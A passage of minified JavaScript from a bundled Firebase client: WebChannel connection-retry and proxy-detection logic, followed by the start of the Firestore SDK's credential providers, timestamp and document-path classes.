ne=-1;for(;;){const fe=["count="+T];ne==-1?0<T?(ne=Z[0].g,fe.push("ofs="+ne)):ne=0:fe.push("ofs="+ne);let wt=!0;for(let Cn=0;Cn<T;Cn++){let et=Z[Cn].g;const zn=Z[Cn].map;if(et-=ne,0>et)ne=Math.max(0,Z[Cn].g-100),wt=!1;else try{eR(zn,fe,"req"+et+"_")}catch{U&&U(zn)}}if(wt){U=fe.join("&");break e}}}return c=c.i.splice(0,T),g.D=c,U}function D1(c){if(!c.g&&!c.u){c.Y=1;var g=c.Fa;M||H(),R||(M(),R=!0),j.add(g,c),c.v=0}}function mg(c){return c.g||c.u||3<=c.v?!1:(c.Y++,c.u=Et(p(c.Fa,c),U1(c,c.v)),c.v++,!0)}n.Fa=function(){if(this.u=null,O1(this),this.ba&&!(this.M||this.g==null||0>=this.R)){var c=2*this.R;this.j.info("BP detection timer enabled: "+c),this.A=Et(p(this.ab,this),c)}},n.ab=function(){this.A&&(this.A=null,this.j.info("BP detection timeout reached."),this.j.info("Buffering proxy detected and switch to long-polling!"),this.F=!1,this.M=!0,Ge(10),Dh(this),O1(this))};function yg(c){c.A!=null&&(a.clearTimeout(c.A),c.A=null)}function O1(c){c.g=new Br(c,c.j,"rpc",c.Y),c.m===null&&(c.g.H=c.o),c.g.O=0;var g=zi(c.qa);kt(g,"RID","rpc"),kt(g,"SID",c.K),kt(g,"AID",c.T),kt(g,"CI",c.F?"0":"1"),!c.F&&c.ja&&kt(g,"TO",c.ja),kt(g,"TYPE","xmlhttp"),Mc(c,g),c.m&&c.o&&pg(g,c.m,c.o),c.L&&(c.g.I=c.L);var T=c.g;c=c.ia,T.L=1,T.v=Mh(zi(g)),T.m=null,T.P=!0,Na(T,c)}n.Za=function(){this.C!=null&&(this.C=null,Dh(this),mg(this),Ge(19))};function Bh(c){c.C!=null&&(a.clearTimeout(c.C),c.C=null)}function B1(c,g){var T=null;if(c.g==g){Bh(c),yg(c),c.g=null;var U=2}else if(Po(c.h,g))T=g.D,g1(c.h,g),U=1;else return;if(c.G!=0){if(g.o)if(U==1){T=g.m?g.m.length:0,g=Date.now()-g.F;var Z=c.B;U=At(),m(U,new Ec(U,T)),Oh(c)}else D1(c);else if(Z=g.s,Z==3||Z==0&&0<g.X||!(U==1&&iR(c,g)||U==2&&mg(c)))switch(T&&0<T.length&&(g=c.h,g.i=g.i.concat(T)),Z){case 1:Do(c,5);break;case 4:Do(c,10);break;case 3:Do(c,6);break;default:Do(c,2)}}}function U1(c,g){let T=c.Ta+Math.floor(Math.random()*c.cb);return c.isActive()||(T*=2),T*g}function Do(c,g){if(c.j.info("Error code "+g),g==2){var T=p(c.fb,c),U=c.Xa;const Z=!U;U=new Lo(U||"//www.google.com/images/cleardot.gif"),a.location&&a.location.protocol=="http"||Ch(U,"https"),Mh(U),Z?ZC(U.toString(),T):JC(U.toString(),T)}else Ge(2);c.G=0,c.l&&c.l.sa(g),j1(c),N1(c)}n.fb=function(c){c?(this.j.info("Successfully pinged google.com"),Ge(2)):(this.j.info("Failed to ping google.com"),Ge(1))};function j1(c){if(c.G=0,c.ka=[],c.l){const g=m1(c.h);(g.length!=0||c.i.length!=0)&&(I(c.ka,g),I(c.ka,c.i),c.h.i.length=0,k(c.i),c.i.length=0),c.l.ra()}}function V1(c,g,T){var U=T instanceof Lo?zi(T):new Lo(T);if(U.g!="")g&&(U.g=g+"."+U.g),Rh(U,U.s);else{var Z=a.location;U=Z.protocol,g=g?g+"."+Z.hostname:Z.hostname,Z=+Z.port;var ne=new Lo(null);U&&Ch(ne,U),g&&(ne.g=g),Z&&Rh(ne,Z),T&&(ne.l=T),U=ne}return T=c.D,g=c.ya,T&&g&&kt(U,T,g),kt(U,"VER",c.la),Mc(c,U),U}function F1(c,g,T){if(g&&!c.J)throw Error("Can't create secondary domain capable XhrIo object.");return g=c.Ca&&!c.pa?new Jt(new Nh({eb:T})):new Jt(c.pa),g.Ha(c.J),g}n.isActive=function(){return!!this.l&&this.l.isActive(this)};function z1(){}n=z1.prototype,n.ua=function(){},n.ta=function(){},n.sa=function(){},n.ra=function(){},n.isActive=function(){return!0},n.Na=function(){};function Uh(){}Uh.prototype.g=function(c,g){return new Ir(c,g)};function Ir(c,g){P.call(this),this.g=new M1(g),this.l=c,this.h=g&&g.messageUrlParams||null,c=g&&g.messageHeaders||null,g&&g.clientProtocolHeaderRequired&&(c?c["X-Client-Protocol"]="webchannel":c={"X-Client-Protocol":"webchannel"}),this.g.o=c,c=g&&g.initMessageHeaders||null,g&&g.messageContentType&&(c?c["X-WebChannel-Content-Type"]=g.messageContentType:c={"X-WebChannel-Content-Type":g.messageContentType}),g&&g.va&&(c?c["X-WebChannel-Client-Profile"]=g.va:c={"X-WebChannel-Client-Profile":g.va}),this.g.S=c,(c=g&&g.Sb)&&!b(c)&&(this.g.m=c),this.v=g&&g.supportsCrossDomainXhr||!1,this.u=g&&g.sendRawJson||!1,(g=g&&g.httpSessionIdParam)&&!b(g)&&(this.g.D=g,c=this.h,c!==null&&g in c&&(c=this.h,g in c&&delete c[g])),this.j=new ja(this)}x(Ir,P),Ir.prototype.m=function(){this.g.l=this.j,this.v&&(this.g.J=!0),this.g.connect(this.l,this.h||void 0)},Ir.prototype.close=function(){gg(this.g)},Ir.prototype.o=function(c){var g=this.g;if(typeof c=="string"){var T={};T.__data__=c,c=T}else this.u&&(T={},T.__data__=Re(c),c=T);g.i.push(new Tc(g.Ya++,c)),g.G==3&&Oh(g)},Ir.prototype.N=function(){this.g.l=null,delete this.j,gg(this.g),delete this.g,Ir.aa.N.call(this)};function W1(c){Ca.call(this),c.__headers__&&(this.headers=c.__headers__,this.statusCode=c.__status__,delete c.__headers__,delete c.__status__);var g=c.__sm__;if(g){e:{for(const T in g){c=T;break e}c=void 0}(this.i=c)&&(c=this.i,g=g!==null&&c in g?g[c]:void 0),this.data=g}else this.data=c}x(W1,Ca);function $1(){Dt.call(this),this.status=1}x($1,Dt);function ja(c){this.g=c}x(ja,z1),ja.prototype.ua=function(){m(this.g,"a")},ja.prototype.ta=function(c){m(this.g,new W1(c))},ja.prototype.sa=function(c){m(this.g,new $1)},ja.prototype.ra=function(){m(this.g,"b")},Uh.prototype.createWebChannel=Uh.prototype.g,Ir.prototype.send=Ir.prototype.o,Ir.prototype.open=Ir.prototype.m,Ir.prototype.close=Ir.prototype.close,ak=function(){return new Uh},ok=function(){return At()},sk=pt,Sy={mb:0,pb:1,qb:2,Jb:3,Ob:4,Lb:5,Mb:6,Kb:7,Ib:8,Nb:9,PROXY:10,NOPROXY:11,Gb:12,Cb:13,Db:14,Bb:15,Eb:16,Fb:17,ib:18,hb:19,jb:20},bt.NO_ERROR=0,bt.TIMEOUT=8,bt.HTTP_ERROR=6,Wf=bt,Ic.COMPLETE="complete",ik=Ic,Vt.EventType=_t,_t.OPEN="a",_t.CLOSE="b",_t.ERROR="c",_t.MESSAGE="d",P.prototype.listen=P.prototype.K,Zc=Vt,Jt.prototype.listenOnce=Jt.prototype.L,Jt.prototype.getLastError=Jt.prototype.Ka,Jt.prototype.getLastErrorCode=Jt.prototype.Ba,Jt.prototype.getStatus=Jt.prototype.Z,Jt.prototype.getResponseJson=Jt.prototype.Oa,Jt.prototype.getResponseText=Jt.prototype.oa,Jt.prototype.send=Jt.prototype.ea,Jt.prototype.setWithCredentials=Jt.prototype.Ha,rk=Jt}).apply(typeof gf<"u"?gf:typeof self<"u"?self:typeof window<"u"?window:{});const LI="@firebase/firestore",DI="4.7.10";/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Jn{constructor(e){this.uid=e}isAuthenticated(){return this.uid!=null}toKey(){return this.isAuthenticated()?"uid:"+this.uid:"anonymous-user"}isEqual(e){return e.uid===this.uid}}Jn.UNAUTHENTICATED=new Jn(null),Jn.GOOGLE_CREDENTIALS=new Jn("google-credentials-uid"),Jn.FIRST_PARTY=new Jn("first-party-uid"),Jn.MOCK_USER=new Jn("mock-user");/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let dc="11.5.0";/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const ma=new Ev("@firebase/firestore");function Ka(){return ma.logLevel}function me(n,...e){if(ma.logLevel<=Qe.DEBUG){const t=e.map(Lv);ma.debug(`Firestore (${dc}): ${n}`,...t)}}function ys(n,...e){if(ma.logLevel<=Qe.ERROR){const t=e.map(Lv);ma.error(`Firestore (${dc}): ${n}`,...t)}}function Kl(n,...e){if(ma.logLevel<=Qe.WARN){const t=e.map(Lv);ma.warn(`Firestore (${dc}): ${n}`,...t)}}function Lv(n){if(typeof n=="string")return n;try{/**
* @license
* Copyright 2020 Google LLC
*
* Licensed under the Apache License, Version 2.0 (the "License");
* you may not use this file except in compliance with the License.
* You may obtain a copy of the License at
*
*   http://www.apache.org/licenses/LICENSE-2.0
*
* Unless required by applicable law or agreed to in writing, software
* distributed under the License is distributed on an "AS IS" BASIS,
* WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
* See the License for the specific language governing permissions and
* limitations under the License.
*/return function(t){return JSON.stringify(t)}(n)}catch{return n}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Ne(n="Unexpected state"){const e=`FIRESTORE (${dc}) INTERNAL ASSERTION FAILED: `+n;throw ys(e),new Error(e)}function st(n,e){n||Ne()}function Be(n,e){return n}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const ie={OK:"ok",CANCELLED:"cancelled",UNKNOWN:"unknown",INVALID_ARGUMENT:"invalid-argument",DEADLINE_EXCEEDED:"deadline-exceeded",NOT_FOUND:"not-found",ALREADY_EXISTS:"already-exists",PERMISSION_DENIED:"permission-denied",UNAUTHENTICATED:"unauthenticated",RESOURCE_EXHAUSTED:"resource-exhausted",FAILED_PRECONDITION:"failed-precondition",ABORTED:"aborted",OUT_OF_RANGE:"out-of-range",UNIMPLEMENTED:"unimplemented",INTERNAL:"internal",UNAVAILABLE:"unavailable",DATA_LOSS:"data-loss"};class we extends Es{constructor(e,t){super(e,t),this.code=e,this.message=t,this.toString=()=>`${this.name}: [code=${this.code}]: ${this.message}`}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class as{constructor(){this.promise=new Promise((e,t)=>{this.resolve=e,this.reject=t})}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class lk{constructor(e,t){this.user=t,this.type="OAuth",this.headers=new Map,this.headers.set("Authorization",`Bearer ${e}`)}}class SV{getToken(){return Promise.resolve(null)}invalidateToken(){}start(e,t){e.enqueueRetryable(()=>t(Jn.UNAUTHENTICATED))}shutdown(){}}class TV{constructor(e){this.token=e,this.changeListener=null}getToken(){return Promise.resolve(this.token)}invalidateToken(){}start(e,t){this.changeListener=t,e.enqueueRetryable(()=>t(this.token.user))}shutdown(){this.changeListener=null}}class AV{constructor(e){this.t=e,this.currentUser=Jn.UNAUTHENTICATED,this.i=0,this.forceRefresh=!1,this.auth=null}start(e,t){st(this.o===void 0);let r=this.i;const i=l=>this.i!==r?(r=this.i,t(l)):Promise.resolve();let s=new as;this.o=()=>{this.i++,this.currentUser=this.u(),s.resolve(),s=new as,e.enqueueRetryable(()=>i(this.currentUser))};const o=()=>{const l=s;e.enqueueRetryable(async()=>{await l.promise,await i(this.currentUser)})},a=l=>{me("FirebaseAuthCredentialsProvider","Auth detected"),this.auth=l,this.o&&(this.auth.addAuthTokenListener(this.o),o())};this.t.onInit(l=>a(l)),setTimeout(()=>{if(!this.auth){const l=this.t.getImmediate({optional:!0});l?a(l):(me("FirebaseAuthCredentialsProvider","Auth not yet detected"),s.resolve(),s=new as)}},0),o()}getToken(){const e=this.i,t=this.forceRefresh;return this.forceRefresh=!1,this.auth?this.auth.getToken(t).then(r=>this.i!==e?(me("FirebaseAuthCredentialsProvider","getToken aborted due to token change."),this.getToken()):r?(st(typeof r.accessToken=="string"),new lk(r.accessToken,this.currentUser)):null):Promise.resolve(null)}invalidateToken(){this.forceRefresh=!0}shutdown(){this.auth&&this.o&&this.auth.removeAuthTokenListener(this.o),this.o=void 0}u(){const e=this.auth&&this.auth.getUid();return st(e===null||typeof e=="string"),new Jn(e)}}class bV{constructor(e,t,r){this.l=e,this.h=t,this.P=r,this.type="FirstParty",this.user=Jn.FIRST_PARTY,this.T=new Map}I(){return this.P?this.P():null}get headers(){this.T.set("X-Goog-AuthUser",this.l);const e=this.I();return e&&this.T.set("Authorization",e),this.h&&this.T.set("X-Goog-Iam-Authorization-Token",this.h),this.T}}class xV{constructor(e,t,r){this.l=e,this.h=t,this.P=r}getToken(){return Promise.resolve(new bV(this.l,this.h,this.P))}start(e,t){e.enqueueRetryable(()=>t(Jn.FIRST_PARTY))}shutdown(){}invalidateToken(){}}class OI{constructor(e){this.value=e,this.type="AppCheck",this.headers=new Map,e&&e.length>0&&this.headers.set("x-firebase-appcheck",this.value)}}class kV{constructor(e,t){this.A=t,this.forceRefresh=!1,this.appCheck=null,this.R=null,this.V=null,oi(e)&&e.settings.appCheckToken&&(this.V=e.settings.appCheckToken)}start(e,t){st(this.o===void 0);const r=s=>{s.error!=null&&me("FirebaseAppCheckTokenProvider",`Error getting App Check token; using placeholder token instead. Error: ${s.error.message}`);const o=s.token!==this.R;return this.R=s.token,me("FirebaseAppCheckTokenProvider",`Received ${o?"new":"existing"} token.`),o?t(s.token):Promise.resolve()};this.o=s=>{e.enqueueRetryable(()=>r(s))};const i=s=>{me("FirebaseAppCheckTokenProvider","AppCheck detected"),this.appCheck=s,this.o&&this.appCheck.addTokenListener(this.o)};this.A.onInit(s=>i(s)),setTimeout(()=>{if(!this.appCheck){const s=this.A.getImmediate({optional:!0});s?i(s):me("FirebaseAppCheckTokenProvider","AppCheck not yet detected")}},0)}getToken(){if(this.V)return Promise.resolve(new OI(this.V));const e=this.forceRefresh;return this.forceRefresh=!1,this.appCheck?this.appCheck.getToken(e).then(t=>t?(st(typeof t.token=="string"),this.R=t.token,new OI(t.token)):null):Promise.resolve(null)}invalidateToken(){this.forceRefresh=!0}shutdown(){this.appCheck&&this.o&&this.appCheck.removeTokenListener(this.o),this.o=void 0}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function CV(n){const e=typeof self<"u"&&(self.crypto||self.msCrypto),t=new Uint8Array(n);if(e&&typeof e.getRandomValues=="function")e.getRandomValues(t);else for(let r=0;r<n;r++)t[r]=Math.floor(256*Math.random());return t}/**
 * @license
 * Copyright 2023 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function ck(){return new TextEncoder}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class uk{static newId(){const e="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",t=62*Math.floor(4.129032258064516);let r="";for(;r.length<20;){const i=CV(40);for(let s=0;s<i.length;++s)r.length<20&&i[s]<t&&(r+=e.charAt(i[s]%62))}return r}}function $e(n,e){return n<e?-1:n>e?1:0}function Ty(n,e){let t=0;for(;t<n.length&&t<e.length;){const r=n.codePointAt(t),i=e.codePointAt(t);if(r!==i){if(r<128&&i<128)return $e(r,i);{const s=ck(),o=RV(s.encode(BI(n,t)),s.encode(BI(e,t)));return o!==0?o:$e(r,i)}}t+=r>65535?2:1}return $e(n.length,e.length)}function BI(n,e){return n.codePointAt(e)>65535?n.substring(e,e+2):n.substring(e,e+1)}function RV(n,e){for(let t=0;t<n.length&&t<e.length;++t)if(n[t]!==e[t])return $e(n[t],e[t]);return $e(n.length,e.length)}function Gl(n,e,t){return n.length===e.length&&n.every((r,i)=>t(r,e[i]))}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const UI=-62135596800,jI=1e6;class yn{static now(){return yn.fromMillis(Date.now())}static fromDate(e){return yn.fromMillis(e.getTime())}static fromMillis(e){const t=Math.floor(e/1e3),r=Math.floor((e-1e3*t)*jI);return new yn(t,r)}constructor(e,t){if(this.seconds=e,this.nanoseconds=t,t<0)throw new we(ie.INVALID_ARGUMENT,"Timestamp nanoseconds out of range: "+t);if(t>=1e9)throw new we(ie.INVALID_ARGUMENT,"Timestamp nanoseconds out of range: "+t);if(e<UI)throw new we(ie.INVALID_ARGUMENT,"Timestamp seconds out of range: "+e);if(e>=253402300800)throw new we(ie.INVALID_ARGUMENT,"Timestamp seconds out of range: "+e)}toDate(){return new Date(this.toMillis())}toMillis(){return 1e3*this.seconds+this.nanoseconds/jI}_compareTo(e){return this.seconds===e.seconds?$e(this.nanoseconds,e.nanoseconds):$e(this.seconds,e.seconds)}isEqual(e){return e.seconds===this.seconds&&e.nanoseconds===this.nanoseconds}toString(){return"Timestamp(seconds="+this.seconds+", nanoseconds="+this.nanoseconds+")"}toJSON(){return{seconds:this.seconds,nanoseconds:this.nanoseconds}}valueOf(){const e=this.seconds-UI;return String(e).padStart(12,"0")+"."+String(this.nanoseconds).padStart(9,"0")}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class De{static fromTimestamp(e){return new De(e)}static min(){return new De(new yn(0,0))}static max(){return new De(new yn(253402300799,999999999))}constructor(e){this.timestamp=e}compareTo(e){return this.timestamp._compareTo(e.timestamp)}isEqual(e){return this.timestamp.isEqual(e.timestamp)}toMicroseconds(){return 1e6*this.timestamp.seconds+this.timestamp.nanoseconds/1e3}toString(){return"SnapshotVersion("+this.timestamp.toString()+")"}toTimestamp(){return this.timestamp}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const VI="__name__";class Si{constructor(e,t,r){t===void 0?t=0:t>e.length&&Ne(),r===void 0?r=e.length-t:r>e.length-t&&Ne(),this.segments=e,this.offset=t,this.len=r}get length(){return this.len}isEqual(e){return Si.comparator(this,e)===0}child(e){const t=this.segments.slice(this.offset,this.limit());return e instanceof Si?e.forEach(r=>{t.push(r)}):t.push(e),this.construct(t)}limit(){return this.offset+this.length}popFirst(e){return e=e===void 0?1:e,this.construct(this.segments,this.offset+e,this.length-e)}popLast(){return this.construct(this.segments,this.offset,this.length-1)}firstSegment(){return this.segments[this.offset]}lastSegment(){return this.get(this.length-1)}get(e){return this.segments[this.offset+e]}isEmpty(){return this.length===0}isPrefixOf(e){if(e.length<this.length)return!1;for(let t=0;t<this.length;t++)if(this.get(t)!==e.get(t))return!1;return!0}isImmediateParentOf(e){if(this.length+1!==e.length)return!1;for(let t=0;t<this.length;t++)if(this.get(t)!==e.get(t))return!1;return!0}forEach(e){for(let t=this.offset,r=this.limit();t<r;t++)e(this.segments[t])}toArray(){return this.segments.slice(this.offset,this.limit())}static comparator(e,t){const r=Math.min(e.length,t.length);for(let i=0;i<r;i++){const s=Si.compareSegments(e.get(i),t.get(i));if(s!==0)return s}return $e(e.length,t.length)}static compareSegments(e,t){const r=Si.isNumericId(e),i=Si.isNumericId(t);return r&&!i?-1:!r&&i?1:r&&i?Si.extractNumericId(e).compare(Si.extractNumericId(t)):Ty(e,t)}static isNumericId(e){return e.startsWith("__id")&&e.endsWith("__")}static extractNumericId(e){return uo.fromString(e.substring(4,e.length-2))}}class Mt extends Si{construct(e,t,r){return new Mt(e,t,r)}canonicalString(){return this.toArray().join("/")}toString(){return this.canonicalString()}toUriEncodedString(){return this.toArray().map(encodeURIComponent).join("/")}static fromString(...e){const t=[];for(const r of e){if(r.indexOf("//")>=0)throw new we(ie.INVALID_ARGUMENT,`Invalid segment (${r}). Paths must not contain // in them.`);t.push(...r.split("/").filter(i=>i.length>0))}return new Mt(t)}static emptyPath(){return new Mt([])}}const MV=/^[_a-zA-Z][_a-zA-Z0-9]*$/;class Un extends Si{construct(e,t,r){return new Un(e,t,r)}static isValidIdentifier(e){return MV.test(e)}canonicalString(){return this.toArray().map(e=>(e=e.replace(/\\/g,"\\\\").replace(/`/g,"\\`"),Un.isValidIdentifier(e)||(e="`"+e+"`"),e)).join(".")}toString(){return this.canonicalString()}isKeyField(){return this.length===1&&this.get(0)===VI}static keyField(){return new Un([VI])}static fromServerFormat(e){const t=[];let r="",i=0;const s=()=>{if(r.length===0)throw new we(ie.INVALID_ARGUMENT,`Invalid field path (${e}). Paths must not be empty, begin with '.', end with '.', or contain '..'`);t.push(r),r=""};let o=!1;for(;i<e.length;){const a=e[i];if(a==="\\"){if(i+1===e.length)throw new we(ie.INVALID_ARGUMENT,"Path has trailing escape character: "+e);const l=e[i+1];if(l!=="\\"&&l!=="."&&l!=="`")throw new we(ie.INVALID_ARGUMENT,"Path has invalid escape sequence: "+e);r+=l,i+=2}else a==="`"?(o=!o,i++):a!=="."||o?(r+=a,i++):(s(),i++)}if(s(),o)throw new we(ie.INVALID_ARGUMENT,"Unterminated ` in path: "+e);return new Un(t)}static emptyPath(){return new Un([])}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Te{constructor(e){this.path=e}static fromPath(e){return new Te(Mt.fromString(e))}static fromName(e){return new Te(Mt.fromString(e).popFirst(5))}static empty(){return new Te(Mt.emptyPath())}get collectionGroup(){return this.path.popLast().lastSegment()}hasCollectionId(e){return this.path.length>=2&&this.path.get(this.path.length-2)===e}getCollectionGroup(){return this.path.get(this.path.length-2)}getCollectionPath(){return this.path.popLast()}isEqual(e){return e!==null&&Mt.comparator(this.path,e.path)===0}toString(){return this.path.toString()}static comparator(e,t){return Mt.comparator(e.path,t.path)}static isDocumentKey(e){return e.length%2==0}static fromSegments(e){return new Te(new Mt(e.slice()))}}/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Yu=-1;function NV(n,e){const t=n.toTimestamp().seconds,r=n.toTimestamp().nanoseconds+1,i=De.fromTimestamp(r===1e9?new yn(t+1,0):new yn(t,r));return new go(i,Te.empty(),e)}function PV(n){return new go(n.readTime,n.key,Yu)}class go{constructor(e,t,r){this.readTime=e,this.documentKey=t,this.largestBatchId=r}static min(){return new go(De.min(),Te.empty(),Yu)}static max(){return new go(De.max(),Te.empty(),Yu)}}function LV(n,e){let t=n.readTime.compareTo(e.readTime);return t!==0?t:(t=Te.comparator(n.documentKey,e.documentKey),t!==0?t:$e(n.largestBatchId,e.largestBatchId))}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const DV="The current tab is not in the required state to perform this operation. It might be necessary to refresh the browser tab.";class OV{constructor(){this.onCommittedListeners=[]}addOnCommittedListener(e){this.onCommittedListeners.push(e)}raiseOnCommittedEvent(){this.onCommittedListeners.forEach(e=>e())}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function pc(n){if(n.code!==ie.FAILED_PRECONDITION||n.message!==DV)throw n;me("LocalStore","Unexpectedly lost primary lease")}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
